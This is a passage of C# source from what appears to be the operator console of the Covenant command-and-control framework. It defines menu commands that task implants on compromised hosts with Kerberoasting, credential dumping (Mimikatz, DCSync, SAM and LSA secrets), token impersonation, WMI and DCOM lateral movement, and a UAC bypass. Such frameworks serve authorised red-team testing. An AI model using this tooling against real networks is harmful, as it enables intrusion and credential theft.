                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractRubeus : MenuCommand
    {
        public MenuCommandGruntInteractRubeus()
        {
            this.Name = "Rubeus";
            this.Description = "Use a Rubeus command.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify a Rubeus command.");
                EliteConsole.PrintFormattedErrorLine("Usage: Rubeus <command>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Rubeus" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + String.Join(" ", commands.GetRange(1, commands.Count() - 1)));
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }


    public class MenuCommandGruntInteractKerberoast : MenuCommand
    {
        public MenuCommandGruntInteractKerberoast()
        {
            this.Name = "Kerberoast";
            this.Description = "Perform a \"kerberoasting\" attack to retreive crackable SPN tickets.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Usernames" },
                new MenuCommandParameter { Name = "Hash Format" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 1)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: Kerberoast <usernames> <hash_format>");
            }
            else
            {
                string usernames = null;
                string format = "Hashcat";
                if (commands.Count() > 1)
                {
                    if (commands.Count() == 2)
                    {
                        if (commands[1].ToLower() == "hashcat" || commands[1].ToLower() == "john")
                        {
                            format = commands[1];
                        }
                        else
                        {
                            usernames = commands[1];
                        }
                    }
                    else if (commands.Count() == 3)
                    {
                        usernames = commands[1];
                        if (commands[2].ToLower() == "hashcat" || commands[2].ToLower() == "john")
                        {
                            format = commands[2];
                        }
                        else
                        {
                            EliteConsole.PrintFormattedErrorLine("Hash Format must be either \"Hashcat\" or \"John\"");
                            EliteConsole.PrintFormattedErrorLine("Usage: Kerberoast <usernames> <hash_format>");
                        }
                    }
                    else
                    {
                        EliteConsole.PrintFormattedErrorLine("Usage: Kerberoast <usernames> <hash_format>");
                    }
                }
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Kerberoast" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Usernames " + usernames);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set HashFormat " + format);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractGetDomainUser : MenuCommand
    {
        public MenuCommandGruntInteractGetDomainUser()
        {
            this.Name = "GetDomainUser";
            this.Description = "Gets a list of specified (or all) user `DomainObject`s in the current Domain.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Identities" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() > 2)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetDomainUser <identities>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "GetDomainUser" });

                if (commands.Count == 2)
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Identities " + commands[1]);
                }
                else
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Identities");
                }

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractGetDomainGroup : MenuCommand
    {
        public MenuCommandGruntInteractGetDomainGroup()
        {
            this.Name = "GetDomainGroup";
            this.Description = "Gets a list of specified (or all) group `DomainObject`s in the current Domain.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Identities" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() > 2)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetDomainGroup <identities>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "GetDomainGroup" });

                if (commands.Count == 2)
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Identities " + commands[1]);
                }
                else
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Identities");
                }

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractGetDomainComputer : MenuCommand
    {
        public MenuCommandGruntInteractGetDomainComputer()
        {
            this.Name = "GetDomainComputer";
            this.Description = "Gets a list of specified (or all) computer `DomainObject`s in the current Domain.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Identities" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() > 2)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetDomainComputer <identities>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "GetDomainComputer" });

                if (commands.Count == 2)
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Identities " + commands[1]);
                }
                else
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Identities");
                }

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractGetNetLocalGroup : MenuCommand
    {
        public MenuCommandGruntInteractGetNetLocalGroup()
        {
            this.Name = "GetNetLocalGroup";
            this.Description = "Gets a list of `LocalGroup`s from specified remote computer(s).";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerNames" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetNetLocalGroup <computernames>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "GetNetLocalGroup" });

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerNames " + commands[1]);

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractGetNetLocalGroupMember : MenuCommand
    {
        public MenuCommandGruntInteractGetNetLocalGroupMember()
        {
            this.Name = "GetNetLocalGroupMember";
            this.Description = "Gets a list of `LocalGroupMember`s from specified remote computer(s).";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerNames" },
                new MenuCommandParameter { Name = "LocalGroup" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 3)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetNetLocalGroupMember <computernames> <localgroup>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "GetNetLocalGroupMember" });

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerNames " + commands[1]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set LocalGroup " + commands[2]);

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractGetNetLoggedOnUser : MenuCommand
    {
        public MenuCommandGruntInteractGetNetLoggedOnUser()
        {
            this.Name = "GetNetLoggedOnUser";
            this.Description = "Gets a list of `LoggedOnUser`s from specified remote computer(s).";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerNames" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetNetLoggedOnUser <computernames>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "GetNetLoggedOnUser" });

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerNames " + commands[1]);

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractGetNetSession : MenuCommand
    {
        public MenuCommandGruntInteractGetNetSession()
        {
            this.Name = "GetNetSession";
            this.Description = "Gets a list of `SessionInfo`s from specified remote computer(s).";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerNames" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetNetSession <computernames>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "GetNetSession" });

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerNames " + commands[1]);

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractImpersonateUser : MenuCommand
    {
        public MenuCommandGruntInteractImpersonateUser()
        {
            this.Name = "ImpersonateUser";
            this.Description = "Find a process owned by the specified user and impersonate the token. Used to execute subsequent commands as the specified user.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Username" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: ImpersonateUser <username>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "ImpersonateUser" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Username " + commands[1]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractImpersonateProcess : MenuCommand
    {
        public MenuCommandGruntInteractImpersonateProcess()
        {
            this.Name = "ImpersonateProcess";
            this.Description = "Impersonate the token of the specified process. Used to execute subsequent commands as the user associated with the token of the specified process.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ProcessID" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: ImpersonateProcess <processid>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "ImpersonateProcess" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ProcessID " + commands[1]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractGetSystem : MenuCommand
    {
        public MenuCommandGruntInteractGetSystem()
        {
            this.Name = "GetSystem";
            this.Description = "Impersonate the SYSTEM user. Equates to ImpersonateUser(\"NT AUTHORITY\\SYSTEM\").";
            this.Parameters = new List<MenuCommandParameter>();
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 1)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetSystem");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "GetSystem" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractMakeToken : MenuCommand
    {
        public MenuCommandGruntInteractMakeToken()
        {
            this.Name = "MakeToken";
            this.Description = "Makes a new token with a specified username and password, and impersonates it to conduct future actions as the specified user.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Username" },
                new MenuCommandParameter { Name = "Domain" },
                new MenuCommandParameter { Name = "Password" },
                new MenuCommandParameter { Name = "LogonType" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 4 || commands.Count() > 5)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: MakeToken <username> <domain> <password> <logontype>");
            }
            else
            {
                string username = "username";
                string domain = "domain";
                string password = "password";
                string logontype = "LOGON32_LOGON_NEW_CREDENTIALS";
                if (commands.Count() > 1) { username = commands[1]; }
                if (commands.Count() > 2) { domain = commands[2]; }
                if (commands.Count() > 3) { password = commands[3]; }
                if (commands.Count() > 4) { logontype = commands[4]; }
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "MakeToken" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Username " + username);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Domain " + domain);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Password " + password);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set LogonType " + logontype);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractRevertToSelf : MenuCommand
    {
        public MenuCommandGruntInteractRevertToSelf()
        {
            this.Name = "RevertToSelf";
            this.Description = "Ends the impersonation of any token, reverting back to the initial token associated with the current process. Useful in conjuction with functions that impersonate a token and do not automatically RevertToSelf, such as: ImpersonateUser(), ImpersonateProcess(), GetSystem(), and MakeToken().";
            this.Parameters = new List<MenuCommandParameter>();
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 1)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: RevertToSelf");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "RevertToSelf" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractWMI : MenuCommand
    {
        public MenuCommandGruntInteractWMI()
        {
            this.Name = "WMI";
            this.Description = "Obtain a new Grunt through WMI lateral movement by executing a Launcher on a remote system with Win32_Process Create.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerName" },
                new MenuCommandParameter { Name = "Username" },
                new MenuCommandParameter { Name = "Password" },
                new MenuCommandParameter { Name = "Launcher" },
                new MenuCommandParameter { Name = "Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 5)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: wmi <computername> <username> <password> [ <launcher> | <command> ]");
            }
            else
            {
                List<string> launchers = menuItem.CovenantClient.ApiLaunchersGet().Select(L => L.Name.ToLower()).ToList();

                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "WMI" });

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerName " + commands[1]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Username " + commands[2]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Password " + commands[3]);
                if (commands.Count() == 5 && launchers.Contains(commands[4].ToLower()))
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Launcher " + commands[4]);
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Command");
                }
                else
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + String.Join(" ", commands.GetRange(4, commands.Count() - 4)));
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Launcher");
                }
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractDCOM : MenuCommand
    {
        public MenuCommandGruntInteractDCOM()
        {
            this.Name = "DCOM";
            this.Description = "Execute a process on a remote system using various DCOM methods.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerName" },
                new MenuCommandParameter { Name = "Launcher" },
                new MenuCommandParameter { Name = "Command" },
                new MenuCommandParameter { Name = "Method" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 3)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: dcom <computername> [ <launcher> | <command> ] [ <method> ]");
            }
            else
            {
                List<string> launchers = menuItem.CovenantClient.ApiLaunchersGet().Select(L => L.Name.ToLower()).ToList();

                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "DCOM" });

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerName " + commands[1]);

                if (launchers.Contains(commands[2].ToLower()) && commands.Count() <= 4)
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Launcher " + commands[2]);
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Command");
                    if (commands.Count() == 4)
                    {
                        task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Method " + commands[3]);
                    }
                }
                else
                {
                    if (new List<string> { "mmc20.application", "mmc20_application", "shellwindows", "shellbrowserwindow", "exceldde"}.Contains(commands.Last()))
                    {
                        task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Method " + commands.Last());
                        task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + String.Join(" ", commands.GetRange(2, commands.Count() - 3)));
                    }
                    else
                    {
                        task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + String.Join(" ", commands.GetRange(2, commands.Count() - 2)));
                    }
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Launcher");
                }
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractBypassUAC : MenuCommand
    {
        public MenuCommandGruntInteractBypassUAC()
        {
            this.Name = "BypassUAC";
            this.Description = "Obtain a new high-integrity Grunt by bypassing UAC through token duplication.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Launcher" },
                new MenuCommandParameter { Name = "Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: bypassuac [ <launcher> | <command> ]");
            }
            else
            {
                List<string> launchers = menuItem.CovenantClient.ApiLaunchersGet().Select(L => L.Name.ToLower()).ToList();

                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "BypassUAC" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Launcher " + commands[1]);

                if (commands.Count() == 2 && launchers.Contains(commands[1].ToLower()))
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Launcher " + commands[1]);
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Command");
                }
                else
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + String.Join(" ", commands.GetRange(1, commands.Count() - 1)));
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Launcher");
                }

                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, "Start");
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractTaskOutput : MenuCommand
    {
        public MenuCommandGruntInteractTaskOutput(CovenantAPI CovenantClient) : base(CovenantClient)
        {
            this.Name = "TaskOutput";
            this.Description = "Show the output of a completed task.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Completed Task Name" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            menuItem.Refresh();
            GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
            gruntInteractMenuItem.grunt = this.CovenantClient.ApiGruntsByIdGet(gruntInteractMenuItem.grunt.Id ?? default);
            List<string> commands = Utilities.ParseParameters(UserInput);
            List<GruntTasking> completedGruntTaskings = this.CovenantClient.ApiGruntsByIdTaskingsGet(gruntInteractMenuItem.grunt.Id ?? default)
                                                      .Where(T => T.Status == GruntTaskingStatus.Completed).ToList();
            List<string> completedgruntTaskingNames = completedGruntTaskings.Select(T => T.Name.ToLower()).ToList();
            if (commands.Count() != 2)
            {
                EliteConsole.PrintFormattedErrorLine("Invalid TaskOutput command. Usage is: TaskOutput <completed_task_name>");
                EliteConsole.PrintFormattedErrorLine("Valid completed TaskNames are: " + String.Join(", ", completedgruntTaskingNames));
            }
            else if (!completedgruntTaskingNames.Contains(commands[1].ToLower()))
            {
                EliteConsole.PrintFormattedErrorLine("Invalid TaskName. Valid completed TaskNames are: " + String.Join(", ", completedgruntTaskingNames));
            }
            else
            {
                EliteConsole.PrintFormattedInfoLine("TaskName: " + commands[1] + " Output:");
                EliteConsole.PrintInfoLine(completedGruntTaskings.FirstOrDefault(GT => GT.Name.ToLower() == commands[1].ToLower()).GruntTaskOutput);
            }
        }
    }

    public class GruntInteractMenuItem : MenuItem
    {
        public Grunt grunt { get; set; }

        public string PowerShellImport { get; set; } = "";
        
		public GruntInteractMenuItem(CovenantAPI CovenantClient, EventPrinter EventPrinter) : base(CovenantClient, EventPrinter)
        {
            this.MenuTitle = "Interact";
            this.MenuDescription = "Interact with a Grunt.";
            this.MenuItemParameters = new List<MenuCommandParameter> {
                new MenuCommandParameter {
                    Name = "Grunt Name",
                    Values = CovenantClient.ApiGruntsGet().Where(G => G.Status == GruntStatus.Active)
                                           .Select(G => new MenuCommandParameterValue { Value = G.Name }).ToList()
                }
            };
            this.MenuOptions.Add(new TaskMenuItem(this.CovenantClient, this.EventPrinter, grunt));

            this.AdditionalOptions.Add(new MenuCommandGruntInteractShow(this.CovenantClient));
            this.AdditionalOptions.Add(new MenuCommandGruntInteractSet(this.CovenantClient));
            this.AdditionalOptions.Add(new MenuCommandGruntInteractWhoAmI());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractListDirectory());
			this.AdditionalOptions.Add(new MenuCommandGruntInteractChangeDirectory());
			this.AdditionalOptions.Add(new MenuCommandGruntInteractProcessList());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractRegistryRead());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractRegistryWrite());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractUpload());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractDownload());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractAssembly());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractAssemblyReflect());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractSharpShell());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractShell());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractPowerShell());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractPowerShellImport());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractPortScan());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractMimikatz());
			this.AdditionalOptions.Add(new MenuCommandGruntInteractLogonPasswords());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractSamDump());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractLsaSecrets());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractDCSync());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractRubeus());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractKerberoast());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetDomainUser());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetDomainGroup());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetDomainComputer());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetNetLocalGroup());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetNetLocalGroupMember());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetNetLoggedOnUser());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetNetSession());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractImpersonateUser());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractImpersonateProcess());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractGetSystem());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractMakeToken());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractRevertToSelf());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractWMI());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractDCOM());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractBypassUAC());
            this.AdditionalOptions.Add(new MenuCommandGruntInteractTaskOutput(this.CovenantClient));

            this.SetupMenuAutoComplete();
        }

        public override void Refresh()
        {
            this.grunt = this.CovenantClient.ApiGruntsByIdGet(this.grunt.Id ?? default);
            ((TaskMenuItem)this.MenuOptions.FirstOrDefault(M => M.GetType().Name == "TaskMenuItem")).grunt = grunt;

            List<MenuCommandParameterValue> gruntNames = CovenantClient.ApiGruntsGet().Where(G => G.Status == GruntStatus.Active)
                                                                       .Select(G => new MenuCommandParameterValue { Value = G.Name }).ToList();
            this.MenuItemParameters.FirstOrDefault(P => P.Name == "Grunt Name").Values = gruntNames;

            this.AdditionalOptions.FirstOrDefault(AO => AO.Name == "TaskOutput").Parameters.FirstOrDefault().Values =
                    this.CovenantClient.ApiGruntsByIdTaskingsGet(this.grunt.Id ?? default)
